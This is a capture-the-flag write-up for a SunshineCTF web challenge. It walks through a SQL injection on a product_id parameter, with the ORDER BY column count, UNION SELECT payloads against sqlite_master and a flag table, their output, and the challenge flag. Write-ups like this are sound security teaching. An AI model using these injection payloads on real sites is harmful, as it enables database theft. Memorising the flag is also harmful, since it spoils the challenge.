I visit the site and see this source code:

I click view product and I can view products listed at `https://meteor.sunshinectf.games/product?product_id=1`. I can see products from id 1-11.

I visit `https://meteor.sunshinectf.games/product?product_id=11%20ORDER%20BY%201` and go from `ORDER BY 1` to `ORDER BY 5` where it errors. I now know there are 4 columns.

I visit `https://meteor.sunshinectf.games/product?product_id=11%20UNION%20SELECT%20NULL,name,NULL,NULL%20FROM%20sqlite_master%20WHERE%20type=%27table%27--` and see the second column holds the flag:
```shell
# 11 UNION SELECT NULL,name,NULL,NULL FROM sqlite_master WHERE type='table'--
# Available Space Products ðŸš€

|ID|Name|Description|Price|
|---|---|---|---|
|None|flag|None|None|
```

Dump it contents to get the flag. Visit `https://meteor.sunshinectf.games/product?product_id=11%20UNION%20SELECT%20NULL%2Cflag%2CNULL%2CNULL%20FROM%20flag--`:
```shell
# 11 UNION SELECT NULL,flag,NULL,NULL FROM flag--
# Available Space Products ðŸš€

|ID|Name|Description|Price|
|---|---|---|---|
|None|sun{baby_SQL_injection_this_is_known_as_error_based_SQL_injection_8767289082762892}|None|None|
```
`sun{baby_SQL_injection_this_is_known_as_error_based_SQL_injection_8767289082762892}`
